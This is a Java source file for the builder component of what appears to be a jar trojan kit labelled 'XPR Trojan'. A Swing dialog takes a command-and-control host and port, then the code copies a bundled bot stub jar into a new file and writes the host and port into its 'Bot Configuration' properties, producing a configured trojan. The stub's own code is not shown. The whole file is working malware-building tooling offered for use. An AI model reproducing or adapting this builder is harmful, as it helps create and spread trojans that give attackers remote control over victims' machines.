package New;


import java.awt.Color;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Properties;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;

import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JTextArea;
import javax.swing.UIManager;

public class Buildjar_Trojan {
	

		private static String Host ;
		private static String Port ;
		private static MessageBox MessageBox;
		private JFrame form ;
		private  JTextArea t1,t2;
		public Buildjar_Trojan(){
		
			  
		 form = new JFrame("Build jar Trojan");
		 form.setResizable(false);
		 
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 
		 form.setBounds((widthx -450)/2,( heightx -100)/2, 450, 100);
		  form.setLayout(null);

		 
		 
		 JButton btnNext = new JButton("Ok");
			btnNext.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					showSaveFileDialog();
					//generateBot("XPT_jar_Trojan.jar");
				}
			});
			btnNext.setBounds(form.getWidth() -140, 75, 50, 23);
			
			JButton btnNext2 = new JButton("Cancel");
			btnNext2.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
		 form.setVisible(false);
					//generateBot("XPT_jar_Trojan.jar");
				}
			});
			btnNext2.setBounds(form.getWidth() -75, 75, 70, 23);
	JLabel label1 = new JLabel("Host : ");
			
			label1.setBounds(5, 10, 50, 23);
			
			
			
	JLabel label2 = new JLabel("Port : ");
			
	label2.setBounds(5, 40, 50, 23);
	  t1 = new JTextArea();
	  t2 = new JTextArea();
	  t1.setText("192.168.1.9");
	  t2.setText("81");
	 t1.setBounds(55, 10, 200, 23);
	 t2.setBounds(55, 40, 200, 23);
	 t1.setBackground(java.awt.Color.decode("#FAFAD2"));
	 t2.setBackground(java.awt.Color.decode("#FAFAD2"));
			form.validate();
			label1.setForeground(java.awt.Color.WHITE);
			label2.setForeground(java.awt.Color.WHITE);
			//form.getContentPane().setBackground(java.awt.Color.decode("#E0FFFF"));
	         form.getContentPane().setBackground(Color.GRAY);
	  
	 
	         btnNext.setBackground(java.awt.Color.decode("#E0FFFF"));
	         btnNext2.setBackground(java.awt.Color.decode("#E0FFFF"));
	         
	         Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 12);
	 		t1.setFont(font);
	 		t2.setFont(font);
	 		label1.setFont(font);
	 		label2.setFont(font);
	 		btnNext.setFont(font);
	 		btnNext2.setFont(font);
	         form.add(t1);
			 form.add(t2);
			 form.add(label2);
			 form.add(label1);
			 form.add(btnNext);
			 form.add(btnNext2);
		        /* important Statement */
	         form.setUndecorated(true);
	         /*important Statement*/
			 form.setVisible(true);
			 
		}
		
		private void showSaveFileDialog() {
			JFileChooser fileChooser = new JFileChooser();
			fileChooser.setDialogTitle("Save jar Trojan");
			//fileChooser.setInitialFileName( 

			if(t1.getText().length() == 0){
				MessageBox.errorBox_nothread("Cannot Save Trojan \nEnter Valid Host Information"  , "XPR Trojan Not Saved");

				return;
			}else{
				if(t2.getText().length() == 0){
					MessageBox.errorBox_nothread("Cannot Save Trojan \nEnter Valid Port Information"  , "XPR Trojan Not Saved");

					return;
				}
			}
			String cHost = t1.getText();
			String cPort = t2.getText();
			int userSelection = fileChooser.showSaveDialog(form);
			fileChooser.setFileSelectionMode(0);
			if (userSelection == JFileChooser.APPROVE_OPTION) {
				File fileToSave = fileChooser.getSelectedFile();
				
					generateBot(fileToSave.getPath(),cHost,cPort);
			}
		}
	 
		private  void generateBot(String sFilePath,String host, String port) {
			try {
				if(sFilePath.endsWith(".jar") ==false){
					sFilePath += ".jar";
				}
				JarInputStream tJarInStream = new JarInputStream(this.getClass().getResourceAsStream("/pkg_bot/jar_stub_new.jar"));
			 
				JarOutputStream tJarOutStream = new JarOutputStream(new FileOutputStream(
						sFilePath), tJarInStream.getManifest());

				Properties tProp = new Properties();

				 tProp.put("DNS",host);
				tProp.put("PortA",port);
	 

				ByteArrayOutputStream t = new ByteArrayOutputStream();

				tProp.store(t, "Bot Configuration");

				tJarOutStream.putNextEntry(new JarEntry("config.properties"));
				tJarOutStream.write(t.toByteArray());
				tJarOutStream.closeEntry();

				byte[] tArrBuff = new byte[1024];
				JarEntry entry;

				while ((entry = tJarInStream.getNextJarEntry()) != null) {
					if ("META-INF/MANIFEST.MF".equals(entry.getName())) {
						continue;
					}

					tJarOutStream.putNextEntry(entry);
					int i;

					while ((i = tJarInStream.read(tArrBuff)) > -1) {
						tJarOutStream.write(tArrBuff, 0, i);
					}

					tJarOutStream.closeEntry();
				}

				tJarOutStream.flush();
				tJarOutStream.close();
				tJarInStream.close();
				 
				 JOptionPane.showMessageDialog(null, "Trojan Saved Successfully  \nPath : " +   sFilePath.toString() + "\n", "Saved Trojan Jar", JOptionPane.INFORMATION_MESSAGE);
				//Jcrypt(sFilePath);
						} catch (Exception e) {
				MessageBox.errorBox_nothread("Cannot Save Trojan \n " + "Path : " + sFilePath + "\n" + "Exception : " + e.getMessage(), "XPR Trojan Not Saved");

				e.printStackTrace();
			}
		}
		private  void generateBot_2(String filep,String sFilePath,String host, String port) {
			try {
				if(sFilePath.endsWith(".jar") ==false){
					sFilePath += ".jar";
				}
			    File initialFile = new File(filep);
			    InputStream targetStream = new FileInputStream(initialFile);
				JarInputStream tJarInStream = new JarInputStream(new BufferedInputStream(targetStream));
				
				JarOutputStream tJarOutStream = new JarOutputStream(new FileOutputStream(
						sFilePath), tJarInStream.getManifest());

				Properties tProp = new Properties();

				 tProp.put("DNS",host);
				tProp.put("PortA",port);
	 

				ByteArrayOutputStream t = new ByteArrayOutputStream();

				tProp.store(t, "Bot Configuration");

				tJarOutStream.putNextEntry(new JarEntry("config.properties"));
				tJarOutStream.write(t.toByteArray());
				tJarOutStream.closeEntry();

				byte[] tArrBuff = new byte[1024];
				JarEntry entry;
				MessageBox.infoBox("Building... \n " + "Path : " + sFilePath, "XPR Trojan Saved");
	 
				while ((entry = tJarInStream.getNextJarEntry()) != null) {
					if ("META-INF/MANIFEST.MF".equals(entry.getName())) {
						continue;
					}

					tJarOutStream.putNextEntry(entry);
					int i;

					while ((i = tJarInStream.read(tArrBuff)) > -1) {
						tJarOutStream.write(tArrBuff, 0, i);
					}

					tJarOutStream.closeEntry();
				}

				
				tJarOutStream.flush();
				tJarOutStream.close();
				tJarInStream.close();
						} catch (Exception e) {
				MessageBox.errorBox_nothread("Cannot Save Trojan \n " + "Path : " + sFilePath + "\n" + "Exception : " + e.getMessage(), "XPR Trojan Not Saved");

				e.printStackTrace();
			}
		}
	 
		
	 
	

}
